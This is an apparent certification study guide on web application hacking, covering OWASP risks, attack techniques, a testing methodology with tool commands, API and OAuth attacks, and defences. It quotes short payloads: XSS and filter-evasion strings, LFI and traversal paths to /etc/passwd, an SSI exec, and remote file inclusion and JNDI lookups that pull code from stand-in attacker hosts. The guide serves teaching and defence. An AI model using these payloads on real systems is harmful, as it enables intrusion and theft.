# Module 14 – Hacking Web Applications

> Status: ✅ Reference complete

## 1. Web application concepts
Software that runs in web browsers and connects users to servers over the internet. Client-side: HTML/CSS/JavaScript; server-side: SQL + scripts (Java/C#/Ruby/PHP). **Advantages:** cross-platform, accessible anywhere, customizable interface, device-independent, centralized data storage, improved security/monitoring, scalable (JSP/.NET/SQL).

### How web applications work
User enters URL → browser sends request to web server → web page type check (static `.html`/`.htm` served directly; dynamic `.php`/`.asp`/`.cfm` → web application server) → application server processes (often needs DB data) → database access → response back through web server to the browser.

### Web application architecture (3 layers)
- **Client/presentation layer** — what the user sees/interacts with (browsers on phones/laptops).
- **Business logic layer** — *web-server logic* (request processing, firewall, caching, authentication — Apache/IIS) + *business logic* (code in Java/.NET controlling data flow).
- **Database layer** — stores all data (MySQL/MS SQL, cloud/external services).

### Web services
Apps deployed over the internet using a standard messaging protocol (SOAP) so apps on different platforms interoperate (Java ↔ PHP). Integrated with SOAP, UDDI, WSDL, REST.
- **Architecture roles:** service provider (publishes), service requester (finds/binds — usually the browser), service registry (holds descriptions). **Operations:** publish, find, bind. **Artifacts:** service (software module) + service description (interface/implementation details).
- **Characteristics:** XML-based, coarse-grained, loosely coupled, synchronous & asynchronous support, RPC support.
- **Types:** **SOAP** (Simple Object Access Protocol — defines the XML format, cross-language data exchange) vs **RESTful** (REpresentational State Transfer — architectural approach using HTTP concepts, more productive).
- **Components:** **UDDI** (directory of services), **WSDL** (XML language describing services), **WS-Security** (SOAP extension for integrity/confidentiality/authentication), plus WS-Policy, WS-Work Processes.

### Vulnerability stack (7 layers, top→bottom)
- **L7 Web Applications** — business-logic flaws / XSS in custom Java/.NET apps.
- **L6 Third-Party Components** — insecure services (payment gateways).
- **L5 Web Server** — server info via Nmap/banner grabbing, exploit CVEs.
- **L4 Database** — sqlmap to steal data.
- **L3 Operating System** — open ports, malware/backdoors.
- **L2 Network (router/switch)** — flood switches, sniff traffic.
- **L1 Security Devices (IDS/IPS)** — evasion techniques.

## 2. OWASP Top 10 Application Security Risks (2021)
- **A01 Broken Access Control** — users access things they shouldn't (another account, admin features). Attacks: directory traversal, hidden-field manipulation, IDOR, force browsing, CORS misconfig, privilege escalation, metadata tampering (cookies/JWTs). Vulns: too much default access, bypassing controls, account takeover via ID, unprotected API methods (PUT/POST/DELETE).
- **A02 Cryptographic Failures** (sensitive data exposure) — data not properly encrypted (plaintext / weak MD5/SHA-1 / poor key handling / weak IVs). Attacks: cookie snooping, RC4 NOMORE, same-site attack, pass-the-cookie.
- **A03 Injection** — untrusted input run as code. Attacks: SQL injection, command injection, LDAP injection, XSS, buffer overflow.
- **A04 Insecure Design** — missing security checks in design/workflow. Attacks: business-logic bypass, web-based timing attacks, CAPTCHA attacks, platform exploits. Exploits: request forgery, authentication hijacking, identity theft, data loss, DoS.
- **A05 Security Misconfiguration** — improper setup (default passwords, verbose errors, unpatched). Attacks: XXE, unvalidated redirects/forwards, directory traversal, hidden-field manipulation. Includes unvalidated inputs, parameter/form tampering, improper error handling, insufficient transport-layer protection, improper XXE restriction.
- **A06 Vulnerable & Outdated Components** — old parts (plugins/libraries) with known bugs, running with full privileges. Attacks: platform exploits, Magecart, buffer overflow. Check Exploit-DB, CXSecurity, Zero Day Initiative.
- **A07 Identification & Authentication Failures** — weak login/session handling (forgot-password, remember-me, session IDs in URLs). Attacks: CSRF, cookie/session poisoning, cookie snooping; password/timeout exploitation.
- **A08 Software & Data Integrity Failures** — unverified updates/data → malware injection. Attacks: insecure deserialization, unvalidated redirects, watering hole, DoS, buffer overflow, web service attacks, platform exploits, Magecart.
- **A09 Security Logging & Monitoring Failures** — no logging/alerting → undetected attacks, log tampering. Attacks: web service attacks. Causes: no login/failed-login/transaction logs, vague messages, poor monitoring, local log storage, DAST tools not alerting.
- **A10 Server-Side Request Forgery (SSRF)** — app fetches a URL without validation → access internal systems. Attacks: inject SSRF payload, Cross-Site Port Attack (XSPA), DNS rebinding, H2C smuggling.

### A05 detail — common issues
- **Unvalidated input** — only client-side validation → attacker bypasses by changing data sent to server.
- **Parameter/form tampering** — change values (price, roles, quantities) in hidden fields/cookies/URLs. GET example: change `cust.asp?profile=21&debit=2500` → `profile=82&debit=1500`, or `status=view` → `status=delete`. Tools: WebScarab, WebSploit.
- **Improper error handling** — leaks null-pointer exceptions, system-call failures, DB info, app logical flow, environment.
- **Insufficient transport-layer protection** — weak/expired certs or no encryption → MITM, account theft, phishing.
- **Improper XXE restriction** — external entities read internal files, scan internal network, "billion laughs" DoS.

### A10 detail — SSRF types
- Injecting an SSRF payload; gaining access to internal resources (`file://path/to/file`); internal pages (`?url=http://127.0.0.1/admin`, `/phpmyadmin`); URL scheme to internal files (`file:///etc/passwd`); URL scheme to internal services (FTP `ftp://attacker.net:11211/`, LDAP `ldap://127.0.0.1/%0astats%0aquit`); **XSPA** port scanning (`?url=http://localhost:22/`, `:25/`, `:3389/`).

## 3. Web application attacks
- **Directory traversal** — `../` to access files outside the web root: `http://site/../../../sitebackup.zip`, `http://site/../../../../etc/passwd`. Enables enumerating files/dirs, bypassing auth, finding IDs/passwords in hidden files, viewing customer data.
- **Hidden field manipulation** — edit hidden form fields (prices/discounts) in the page source: `<input type=hidden name=price value=200.00>` → `value=2.00` (electronic shoplifting); or use Burp to trap/modify.
- **Pass-the-cookie** — steal a valid session cookie and use it to bypass login + MFA (server trusts the cookie). Tools: firefox_creds, Mimikatz.
- **Same-site attack** — take over a misconfigured/unused subdomain (shares cookies under eTLD+1) → fake legit page. Redirect `www.certifiedhacker.com` → `rans.certifiedhacker.com` for credential sniffing/phishing/malware.
- **SQL injection** — insert SQL into inputs: `SELECT * FROM t WHERE UserID=2302` → `... OR 1=1` (always true → dumps all rows). Enables login without creds, querying/modifying/dropping the DB, accessing other DBs via trust relationships.
- **Command injection** — insert OS commands via unvalidated input. Types: **shell injection** (`system()`, `StartProcess()`, `java.lang.Runtime.exec()`), **HTML embedding** (deface), **file injection** (`?COLOR=http://evil/exploit?`). Example: `banner.gif||newpassword||1036|60|468` changes account 1036's password.
- **File injection** — app includes a file chosen by user input. PHP `require($drink.'.php')` with `?DRINK=http://jasoneval.com/exploit?` → loads/executes remote malicious PHP (common RFI in PHP; `allow_url_include`).
- **LDAP injection** — co-opt input to build LDAP queries. Login `(&(USER=USERNAME)(PASS=PASSWORD))`; input `certifiedhacker)(&)` → `(&(USER=certifiedhacker)(&))(PASS=blah))` → server processes only `(&(USER=certifiedhacker)(&))` (always true) → login bypass. Goals: login bypass, info disclosure, privilege escalation, info alteration.
- **Server-side JS injection** — unvalidated input in server JS. `eval()` + `while(1)` → DoS (locks event loop); `res.end(require('fs').readdirSync('.').toString())` → list files; `res.end(require('fs').readFileSync('filename'))` → read files; `fs` + `child_process` → run binaries. Threats: KOVTER-style.
- **Server-side includes (SSI) injection** — `<!--#exec cmd="cat /etc/passwd"-->` via `#include`/`#echo` directives.
- **Server-side template injection (SSTI)** — user input in templates interpreted as code. `{{title}}`/`{{username}}` placeholders; `getUsernameFromCookie()` returning `{{system('ls')}}` → RCE.
- **Log injection** — inject `\r\n` to split log entries / `%00` to truncate: `id=\r\n(Fake input)` adds a fake line; `id=%00` stops logging.
- **HTML injection** — inject HTML (not script) into reflected/stored output: `</h2>special offer <a href=evil>malicious link</a><h2>` appears as part of the page / search history for all visitors.
- **CRLF injection** — inject CR (`\r`/`%0d`) + LF (`\n`/`%0a`) → HTTP response splitting, request smuggling, log forging. Log example: `?page=about&%0d%0a127.0.0.1 - 09:25 - /index.php?page=home&restrictedaction=edit`.
- **JNDI injection** — malicious object names in a JNDI lookup. `new InitialContext().lookup(name)` with `/lookup?name=ldap://attacker.com/Object` → Java loads a malicious object from the attacker's RMI server → RCE.
- **XSS (Cross-Site Scripting)** — inject scripts into pages viewed by others; runs with the site's permissions. Exploits: malicious script execution, redirect to malicious server, exploit privileges, ads/IFRAMEs/popups, data manipulation, session hijacking, brute-force cracking, data theft, intranet probing, keylogging/remote monitoring.
  - **Via email:** `<A HREF=http://bank.com/registration.cgi?clientprofile=<SCRIPT>maliciouscode</SCRIPT>>Click here</A>`.
  - **Blog/comment (stored):** `<script>onload=window.location='http://certifiedhacker.com'</script>`; `<script>alert(document.cookie)</script>`.
  - **Filter evasion:** ASCII (`&#106;javascript:`), hexadecimal (`&#x6A;javascript`), Base64 (`eval(atob('...'))`), zero-padding (`&#x6A;javascript&#0000058&#0000097lert(...)`), `String.fromCharCode(88,83,83)`, tabs (`java\tscript:al\tert`) and encoded tabs (`&#x09;`), newlines/carriage returns (`&#x0A;`/`&#x0D;`).
- **Web-based timing attacks** — side-channel on response time. **Direct** (login response time reveals valid username / correct char); **cross-site** (JS measures access time to another site's resources — `getMeasurement` via `Image` error event); **browser-based** (video-parsing — `<video>` suspend→error timing; cache-storage — time to `cache.put`).
- **XXE** — malicious XML referencing external entities → read `/etc/passwd`, SSRF, DoS, rarely RCE.
- **Unvalidated redirects & forwards** — redirect/forward without checking destination → phishing / access-control bypass (session fixation, security-management exploits, failure to restrict URL access, malicious file execution). Types: **open redirection** (header-based / JavaScript-based).
- **Magecart (web skimming)** — inject malicious JS into checkout/payment pages to steal card data. Steps: find outdated e-commerce site → embed malicious JS → activate at checkout → exfiltrate card details.
- **Watering hole** — compromise a site the target frequents; inject malware; wait for the victim to visit.
- **CSRF (one-click attack)** — trick the victim's browser into sending an authenticated state-changing request to a trusted site. Attacker hosts a malicious script; when the logged-in victim visits, the request executes on the trusted server.
- **Cookie/session poisoning** — modify cookie data (often weakly Base64/ROT13-encoded) to impersonate/escalate. Sniff cookie → modify params → submit to server (server trusts it). Cookie types: persistent, non-persistent, secure, non-secure.
- **Insecure deserialization** — inject malicious code into serialized data; executes on deserialize. Example: `<Employee>...<EmpID>2201</EmpID>MALICIOUS PROCEDURE</Employee>` → remote execution.
- **Web service attacks:**
  - **Probing** — trap/analyze the WSDL (ports, connections, message types) → craft valid requests → inject malicious SOAP content, analyze errors.
  - **SOAP injection** — insert malicious chars (quotes/semicolons) into inputs → alter the SOAP message, bypass auth.
  - **SOAPAction spoofing** — manipulate the `SOAPAction` header (e.g. change `createUser` → `deleteAllUsers`) so the gateway allows it (body has createUser). Tool: WS-Attacker.
  - **WS-Address spoofing** — tamper `ReplyTo`/`FaultTo` to divert responses/errors to the attacker (data redirect / DoS).
  - **XML injection** — insert malicious XML/tags to manipulate processing (bypass auth, modify data, DoS).
  - **Parsing attacks** — recursive payloads (infinite loops exhaust parser/CPU), oversize payloads (consume resources). Tools: SoapUI, XMLSpy.
- **DNS rebinding** — short-TTL DNS flips from the attacker site to an internal IP → bypass same-origin → reach internal resources.
- **Clickjacking** — transparent iframe overlay tricking clicks. Techniques: complete transparent overlay (invisible iframe + high z-index), cropping, hidden overlay (1×1 iframe under the cursor), click-event dropping (`pointer-events:none`), rapid content replacement. Cause: missing X-Frame-Options.
- **MarioNet** — abuse Service Workers (+ SyncManager) to run code in the background after the site is closed (survives reboot) — cryptojacking/DDoS/password-cracking/data theft.
- **Other:** cookie snooping, RC4 NOMORE, buffer overflow, business-logic bypass, CAPTCHA attacks, platform exploits, DoS, H2C smuggling, JavaScript hijacking, Cross-Site WebSocket Hijacking (CSWH), obfuscation, network-access attacks, DMZ protocol attacks.

## 4. Web application hacking methodology
### Footprint web infrastructure
Tasks: server discovery, service discovery, server identification, WAF/proxy detection, hidden content discovery, load-balancer detection, web-app tech detection, WebSocket enumeration.
- **Server discovery** — Whois lookup (Netcraft, domaintools, whois.com), DNS interrogation (DNSRecon, nslookup.io, Domain Dossier, DNSdumpster), port scanning.
- **Banner grabbing** — `telnet moviescope.com 80` then press Esc → server banner. **SSL:** `openssl s_client -host <site> -port 443` then `GET / HTTP/1.0` [Enter twice]. Tools: Netcat, ID Serve, Netcraft.
- **Port & service discovery** — common web ports: 80, 81, 88, 443 (SSL), 1433/1434 (MSSQL), 1527 (Oracle), 7001/7002 (WebLogic), 8000/8008/8080 (web/cache), 8085 (Tomcat), 8888, 10000 (Netscape admin). Tools: Nmap, NetScanTools Pro, Advanced Port Scanner.
- **Proxy detection** — `TRACE / HTTP/1.1` + `Host:` → look for added `Via`/`Forwarded` headers.
- **WAF detection** — cookies/headers added by the WAF. Tools: WAFW00F, WhatWaf, Nmap. AI: `nmap -p 80,443 --script http-waf-detect --script-args http-waf-detect.aggro,http-waf-detect.detectBodyChanges <url>`; `wafw00f http://<url>`.
- **Hidden content discovery** — **web spidering/crawling** (OWASP ZAP, Web Data Extractor, Burp, WebScarab, Octoparse), **user-directed spidering** (manual browse + Burp/WebScarab capture).
- **Load-balancer detection** — `host <domain>`, `dig <domain>`, `lbd <domain>` (Server:/Date: header + response diffs).
- **Web-app tech detection** — Wappalyzer, BuiltWith (server software, CMS, frameworks, analytics).
- **WebSocket enumeration** — STEWS: `python3 STEWS-fingerprint.py -1 -k -u <URL>`.

### Analyze web applications
Reveals: software/version, OS, sub-directories/parameters, filename/path/DB-field/query (SQLi opportunities), scripting platform (`.php`/`.asp`/`.jsp`), technologies (.NET/J2EE/PHP), contact/CMS details, SSL cert details, cookies, error messages, publicly accessible files.
- **Techniques:** identify entry points for user input (Burp, WebScarab, ZAP, httprint); identify server-side tech (HTTP headers, session tokens — JSESSIONID=Java, ASPSESSIONID=IIS, ASP.NET_SessionId, PHPSESSID; httprint, WhatWeb); identify server-side functionality (GNU Wget, BlackWidow, curl, examine URL); identify files/directories (Gobuster `gobuster -u <URL> -w common.txt -s 200`, URL Fuzzer, `nmap -sV --script=http-enum <target>`, dirb); identify vulnerabilities (Vega, WPScan, Arachni, Uniscan, Sn1per); map the attack surface.
- **Info gathering:** extract links (Octoparse, Link Extractor), wordlist (`cewl https://certifiedhacker.com`), metadata (ExifTool, Metagoofil, Web Data Extractor Pro), monitor updates (WebSite-Watcher, Visualping), traffic monitoring (Clicky, Google Analytics, Web-Stat, Rank Tracker), **website mirroring** (`wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://certifiedhacker.com`; `httrack https://certifiedhacker.com -O ~/Desktop/certifiedhacker mirror`; HTTrack, Cyotek WebCopy).

### Bypass client-side controls
- **Attack hidden form fields** — save HTML → locate hidden field → edit price → reload → Buy; or Burp to trap the request (try negative values for refunds).
- **Attack browser extensions** — intercept traffic (Burp) or decompile the extension; attack Chrome Sync (steal passwords/history/bookmarks/autofill via fake extensions).
- **Source code review** — find client-side validation logic, obfuscation/encryption, modifiable components, server-side references.

### Attack authentication
- **Username enumeration** — verbose failure messages ("Account not found" vs "Incorrect password"); predictable usernames (user101/user102). Fails against account-lockout policies. Burp automates.
- **Password attacks** — functionality exploits (password changing, recovery, "Remember Me"), guessing, brute-force, dictionary, attack reset mechanism.
  - **Password list** (personal info) vs **password dictionary** (common words). Burp Suite tools: intercepting proxy, spider, scanner, **Intruder**, Repeater, **Sequencer** (token randomness).
  - **Password reset poisoning** — if the app trusts `HTTP_HOST`, send `Host: badhost.com` → reset link `https://badhost.com/reset-pwd.php?token=...` emailed to the victim → attacker captures the token. Steps: get victim email (OSINT) → send reset with altered Host → wait → extract token.
- **Session attacks** — session prediction, session brute-forcing, session poisoning. (`JSESSIONID=user01` → guess `user02`.) Steps: sniff IDs → analyze structure → guess → brute-force.
- **Cookie exploitation** — cookie poisoning (edit cookie data), cookie sniffing (capture on unencrypted network), cookie replay (reuse while the user is logged in). Tools: OWASP ZAP, L0phtCrack, Burp, XSSer.
- **Bypass authentication:**
  - **SAML SSO** — exploit incorrect signature validation / expired sessions / replayed tokens / misdirected messages. **SAML Raider** (Burp extension): capture SAML → edit NameID by inserting a comment (`admin@xyz.org<!-- -->.fakedomain.com`) → SP reads only the first part → access as a different user.
  - **Rate limit** — rotate IPs / modify headers / spread attempts; explore endpoint variants (`/Sign-up`, `/api/v1/sign-up`); blank chars (`%00`,`%0a`,`%0d`,`%09`,`%20`); alter IP origin via headers (`X-Originating-IP`, `X-Forwarded-For`, `X-Remote-IP`, `X-Client-IP`, `X-Host` all = 127.0.0.1; use X-Forwarded-For twice).
  - **MFA** — HTTP response-body manipulation (`{"success":false}` → `{"success":true}`); status-code manipulation (`403 Forbidden {"error":true}` → `200 OK {"success":true}`); phishing/session hijacking.
- **Design flaws:** bad passwords, brute-forcible login, verbose failure messages, insecure credential transmission, weak password-reset / forgotten-password / "Remember Me" / user impersonation, improper credential validation (checks first chars only / ignores case / strips special chars), predictable usernames/passwords, insecure credential distribution.
- **Implementation flaws:** fail-open login (exception in `catch` block → auto login), flaws in multistage login, insecure credential storage (plaintext/weak encryption).

### Attack session management
Two stages: session-token generation + exploitation of token handling. Generate valid tokens via **prediction** (deterministic pattern — weak hex/Base64 encoding, e.g. `user=jason;app=admin;date=...`) or **tampering**. Exploit via MITM, session hijacking, session replay.
- **Token sniffing** — Wireshark/Burp; if the Secure flag isn't set, replay the cookie.
- **Manipulate WebSocket traffic** — Burp: Proxy → WebSockets history → Send to Repeater → clone connection → manipulate → Connect → Send.

### Attack authorization & access controls
- **HTTP request tampering** — URI, parameter tampering, POST data, HTTP headers (Referer `Admin=false`→`true`), query string & cookies, hidden tags.
- **Cookie parameter tampering** — collect & study cookies → modify & replay (Burp) → intercept & replace.
- **Insecure access controls** — parameter-based (find params granting admin), Referer-based (manipulate the Referer), location-based (bypass via proxy/VPN/roaming).
- **Methods:** different user accounts, multistage processes (swap session tokens for lower-privilege ones), static resources (direct URL to PDFs/images), direct access to methods (backend APIs), restrictions on HTTP methods (GET/POST/PUT/DELETE).

### Perform injection / input validation attacks & LFI
Ways: web scripts injection, OS commands injection, SMTP injection, SQL injection, LDAP injection, XPath injection, buffer overflow, file injection, canonicalization (`../`).
- **LFI:** `$file=$_GET['page']; require($file);` → `?page=../../../../etc/passwd`.
  - Evade appended `.php`: null byte `?page=../../etc/passwd%00` or `?page=../../etc/passwd?`.
  - Bypass `.php` execution (read source): `?page=php://filter/convert.base64-encode/resource=index` → `base64 -d savefile.php`.

### Attack application logic flaws & shared environments
- **Logic flaws** — e.g. retail checkout: use Burp to skip the payment stage (forced browsing from stage 2 → stage 4) and get the product free.
- **Shared environments** — attacks on the access mechanism (unpatched remote-admin, poor privilege separation → shell access), attacks between applications (a Perl CGI running `$command` lets an attacker run `whoami`; SQLi in one app reaches others).

### Attack web application client
- **XSS** (inject scripts), **HTTP header injection** (split responses → deface/cache-poison/XSS), **request forgery**, **privacy attacks** (leaked persistent browser state), **redirection attacks**, **frame injection**, **session fixation**, **ActiveX attacks**.

### Attack database connectivity
Connection strings: `Server=sql_box; Database=Common; User ID=uid; Pwd=password;`.
- **Connection string injection** — append `; Encryption=off` via a password field.
- **CSPP (Connection String Parameter Pollution)** — overwrite params:
  - **Hash stealing** — `Data Source=Rogue_Server; Integrated Security=true` → app connects to the rogue MSSQL, captures Windows creds.
  - **Port scanning** — change `Data Source=Target_Server,Target_Port` and read error messages.
  - **Hijacking web credentials** — overwrite `Integrated Security=true` → connect with the web app's system account.
- **Connection pool DoS** — 100 slow queries (>30s) exhaust the ASP.NET pool (default 100/30s).

### Attack web services
(SOAP injection, SOAPAction spoofing, WS-Address spoofing, XML injection, parsing — see §3 Web service attacks.)

### Tools
Metasploit, w3af, Nikto, Sn1per, WSSiP, Web Brutator, timing_attack, HTTrack, SQL/XSS/SQLi scanners (pentest-tools), WebCopier, WPScan, TIDoS-Framework. **AI:** ChatGPT prompts to create/run custom footprinting + vuln-scan scripts.

## 5. Web API and Webhooks
- **Web API** — interface for apps to communicate over HTTP; centralizes data/logic. **SOAP API** (XML/HTTP, cross-OS), **REST API** (stateless, HTTP-based), **RESTful API** (stateless, cacheable, client-server, uniform interface, layered system, code-on-demand), **XML-RPC**, **JSON-RPC**.
- **Webhooks** — user-defined HTTP callbacks ("reverse APIs") that push data on events (via HTTP POST). Webhooks push on events; APIs poll regardless of updates.

### OWASP API Top 10
API1 Broken Object-Level Authorization (BOLA — change object ID), API2 Broken Authentication (steal tokens), API3 Broken Object Property-Level Authorization, API4 Unrestricted Resource Consumption (DoS), API5 Broken Function-Level Authorization (reach admin functions), API6 Unrestricted Access to Sensitive Business Flows, API7 SSRF, API8 Security Misconfiguration, API9 Improper Inventory Management (old API versions), API10 Unsafe Consumption of APIs (trusting third-party APIs).

### Webhook security risks
Data exposure in transit (use HTTPS), lack of verification (HMAC), replay attacks (timestamps), unrestricted sources (IP whitelisting + mutual TLS), duplication/forgery (mutual TLS), endpoint config errors, forged requests (secret token), unvalidated redirects (whitelist URLs).

### API vulnerabilities
Enumerated resources (guessable IDs), sharing via unsigned URLs (hotlinking — use signed URLs), third-party library vulns, improper CORS (`Access-Control-Allow-Origin: *`), code injections (SQLi/XSS), RBAC privilege escalation, no ABAC validation, business-logic flaws.

### Web API hacking methodology
Identify the target → detect security standards → identify the attack surface → launch attacks.
- **Identify target** — HTTP (plaintext headers — manipulate), message formats (JSON for REST, XML for SOAP).
- **Detect security standards** — OpenID Connect, SAML, OAuth 1.X/2.X, WS-Security, SSL (often only sensitive fields encrypted → capture/reuse tokens).
- **API enumeration** — **Kiterunner**: `kr scan https://target.com:8443/ -w routes.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34` (single/multiple targets).
- **Identify attack surface** — API metadata (Swagger/RAML/API-Blueprint/I/O Docs for REST; WSDL/XML-Schema for SOAP), API discovery (record client↔API traffic via proxy → generate metadata), brute force (`api`, `/api/v2`, `/apis.json`). Analyze with **Postman**/ReqBin.
- **Launch attacks:**
  - **Fuzzing** (Fuzzapi) → error messages leak info.
  - **Invalid input** — text for numbers, oversize, null chars; manipulate HTTP headers.
  - **Malicious input** — XML bomb (billion laughs: nested `&lol9;` entities → memory-out-of-bound); upload shell instead of a PDF.
  - **Injection** — `http://billpay.com/api/v1/cust/ '%20or%20'1'='1` → `SELECT * FROM Customers where custID='' or '1'='1'` (also JSON/JavaScript/XPath/XSLT, plus XSS/CSRF).
  - **Insecure SSL** (self-signed → MITM), **IDOR** (try all parameter values), **insecure session/auth** (reused/sequential/unencrypted tokens, token in URL), **credential stuffing** (Sentry MBA, PhantomJS), **API DDoS**.
- **OAuth attacks:** actors = resource owner / authorization-resource server (API) / client. Authorization-code grant params: `response_type`, `client_id`, `redirect_uri`, `scope`, `state`.
  - **Attack on 'Connect' request** — sign up a fake provider account → start Connect but block redirect → CSRF-force the victim to log out/in as the attacker → re-trigger Connect in an iframe → client links the victim's session to the attacker's identity.
  - **Attack on `redirect_uri`** — find a page leaking the URL + running attacker JS (`https://xyz.com/vuln`), set `redirect_uri` to it → OAuth sends `?code=CODE` there → script exfiltrates the code → attacker redeems it.
  - **CSRF on authorization response** — create fake provider account → get a valid auth code → force the victim's browser to send the attacker's code (`<img>`) → client links wrong accounts → account takeover.
  - **Access-token reuse** — a token for ClientA works on ClientB (implicit grant, weak checks).
  - **SSRF via Dynamic Client Registration** — POST `/connect/register` with malicious `logo_uri` / `jwks_uri` / `request_uris` → server fetches attacker URLs.
  - **WebFinger user enumeration** — GET `/.well-known/webfinger?resource=...` → valid username returns a URL.
  - **Flawed scope validation** — escalate the `scope` param (`openid email` → `openid email profile`) to retrieve more data.
- **Other API attacks:** reverse engineering (call functions out of order), user spoofing, MITM (domain squatting `API.io`→`APO.io`), session replay, social engineering, REST API vuln scanning (Astra, Fuzzapi, w3af, AppSpider, Vooki, OWASP ZAP), **IDOR via parameter pollution** (`user_id=654&user_id=321` — auth checks first, data uses last).

### Secure API architecture
Separate API development from API security; an **API gateway** in the DMZ controls traffic, detects threats, acts as a secure proxy. Layered security example: Layer1 user-access check → Layer2 middleware company-ID filter → Layer3 SQL joins verifying ownership → Layer4 safe models → Layer5 response filter. OWASP API solutions: authorization checks + unpredictable GUIDs, anti-brute-force + MFA, restrict modifiable properties, rate limiting, default-deny + RBAC, protect critical flows (CAPTCHA/biometrics), isolate SSRF fetches, TLS + CORS + headers, inventory management, validate third-party data.
- **API best practices:** HTTPS, input validation/sanitization, auth tokens (OAuth2/JWT), rate limiting, MFA, API gateway, monitor/log, least privilege, parameterized queries, regular testing.
- **Webhook best practices:** HTTPS, authenticate every request, sign+verify payloads (HMAC), whitelist source IPs, prevent replay (event IDs + timestamps), limit payload size, rate limiting, idempotent processing, avoid sending sensitive data, log/monitor.

## 6. Web application security (countermeasures)
### Testing
Manual + automated; **SAST** (white-box, source — Codacy, JFrog, Klocwork, Checkmarx One, PT App Inspector), **DAST** (black-box, running app, fuzzing — Invicti, Acunetix, HCL AppScan, Fortify On Demand, StackHawk), **fuzz testing** (mutation/generation/protocol-based; steps: identify target → inputs → generate fuzz → execute → monitor → log; tools WebScarab, Burp, AppScan, Defensics, ffuf). AI-powered: Prompt Fuzzer, Code Genie AI/Codiga/Snyk Code (SAST), ZeroThreat.ai/AppCheck/Veracode (DAST).

### Encoding schemes
URL (`%3d`=`=`, `%20`=space, `%0a`=newline), HTML (`&lt;`/`&gt;`/`&amp;`), Unicode (16-bit `%u2215`, UTF-8 `%c2%a9`), Base64 (email attachments/creds), Hex. **Whitelisting** (allow trusted) vs **blacklisting** (block known-bad) for apps and URLs. Tools: ManageEngine Application Control Plus, BitDefender, Cisco Umbrella, Sucuri WAF; content filtering (WebTitan, Smoothwall, FortiGuard, Barracuda, OpenDNS).

### Defenses by category
- **SQL injection** — validate/sanitize inputs, **prepared statements / parameterized queries**, avoid dynamic SQL, whitelist not blacklist, least-privilege DB account, custom error messages, patch, WAF, limit input length, continuous testing.
- **Command injection** — avoid shell calls, use safe APIs, parameterize, validate + whitelist, escape `;`/`|`/`&`, least privilege, sanitize output, DAST.
- **LDAP injection** — validate inputs, escape `* ( ) \ & |`, avoid string concatenation (parameterized), restrict results, least privilege, LDAPS, access controls.
- **File injection** — strict validation, file-type whitelist, verify MIME, store outside web root, rename uploads, limit size, disable `allow_url_fopen`/`allow_url_include`, least privilege, scan uploads, secure path handling.
- **Server-side JS / SSI / SSTI** — validate + sanitize, avoid `eval()`, safe JSON parsing (`JSON.parse()`), context-sensitive escaping, sandbox, CSP; SSI — avoid `.stm`/`.shtml`, `OPTIONS IncludesNOEXEC`; SSTI — load templates from static files, auto-escaping engines (Jinja2/Handlebars/Thymeleaf), sandbox.
- **Log injection** — validate/sanitize, structured logs (JSON/XML), restrict log access, encrypt sensitive logs, trusted logging libs (Log4j/Winston), integrity checks, log rotation.
- **HTML injection / XSS** — validate all inputs, encode output (context-sensitive), CSP, security-aware frameworks (React/Angular/Django), avoid `eval()`/inline JS, DOMPurify, HttpOnly cookies, WAF, limit input size, regular VAPT.
- **CRLF injection** — encode CR/LF, sanitize `%0d`/`%0a`, whitelist validation, safe header APIs, never trust direct input in headers, escape before logging.
- **Broken access control** — check permissions before access, unpredictable IDs, least privilege, destroy tokens on logout, deny by default, RBAC, log/monitor, restrict CORS, security headers (CSP, X-Frame-Options), MFA.
- **Cryptographic failures** — AES-256 + TLS 1.3/HSTS, HSM/KMS key management, rotate keys, encrypt in transit + at rest, bcrypt/scrypt/Argon2, classify/limit data, disable caching of sensitive data, avoid custom crypto, authenticated encryption (AES-GCM), protect APIs from excessive data exposure.
- **Insecure design** — threat modeling (Microsoft Threat Modeling Tool, OWASP Threat Dragon), security requirements, secure design principles (least privilege, defense in depth, fail securely, secure by default, minimize attack surface), secure SDLC (Microsoft SDL, OWASP SAMM), architectural risk analysis.
- **Security misconfig** — disable unused services/ports, lock down default accounts, patch, force HTTPS, strong SSL/TLS, separate environments, minimize bloat, restrict management access, CIS benchmarks/NIST/Ansible/Puppet/Chef.
- **XXE** — disable external entities + DTDs, secure XML parsers, XSD validation, whitelisting, limit size/complexity, XML security gateway, WAF/IAST, code reviews, log/monitor.
- **Vulnerable components** — keep updated, monitor NVD, patch quickly, dependency management (npm/pip/Maven/Composer), SCA (OWASP Dependency-Check/Snyk/Black Duck), remove unused, trusted sources + signed packages, limit permissions, isolate (containers), maintain inventory.
- **Broken auth/session** — HTTPS, bcrypt/scrypt/Argon2, strong passwords, limit login attempts, MFA, secure session management (long random IDs, invalidate on logout), generic errors, rate limiting + CAPTCHA, secure reset, monitor/alert.
- **Software/data integrity** — digital signatures, trusted sources, SCA (OWASP Dependency-Check/CycloneDX), checksums (SHA-256), secure build (isolated CI/CD), HTTPS + signed updates, automate integrity checks, access control, DB integrity constraints, verified backups.
- **Insecure deserialization** — validate before serialization, safer formats (JSON/XML), whitelist allowed classes, integrity checks/encryption, low-privilege environment, avoid dangerous methods (`__wakeup`/`__destruct`), no code execution on object creation, secure libraries (Kryo), log/monitor, avoid when not needed.
- **Logging/monitoring** — log critical assets, logging standard, include user details, protect logs (append-only/write-once), store securely, sync clocks (NTP), real-time + AI anomaly detection, centralized logging, control access, tools (ELK/Splunk/Graylog).
- **SSRF** — whitelist URLs/IPs, validate input, block internal ranges (127.0.0.1/192.168.x.x), restrict schemes, disable redirects, limit response size/type, WAF, proxy routing, segregate network, log/monitor.
- **Directory traversal** — set access rights, update server, validate input (block `..`/`/`/`\`), whitelist, normalize paths, restrict file names, no direct file access from input, file permissions, disable directory listing, chroot jail.
- **Unvalidated redirects** — avoid redirects/forwards, static URLs, whitelist, map inputs to predefined destinations, validate destination, disallow full URLs, URL encoding/sanitization, token verification, internal redirects only, user warnings.
- **CSRF** — unique per-session CSRF tokens + server validation, SameSite cookies, custom headers, per-request tokens, double-submit cookies, validate Origin/Referer, re-auth for critical actions, frameworks (Django/Rails/Spring), correct HTTP method usage.
- **Cookie/session poisoning** — HTTPS + Secure flag, SameSite, strong random session IDs, regenerate IDs after login, store sensitive data on server, cookie timeout, sign cookies, validate values, restrict scope, logout option.
- **Clickjacking** — `X-Frame-Options: DENY/SAMEORIGIN`, CSP `frame-ancestors`, mask content until verified, SameSite cookies, scanning, UI frame detection, click-confirmation dialogs, Auth0, NoScript/uBlock.
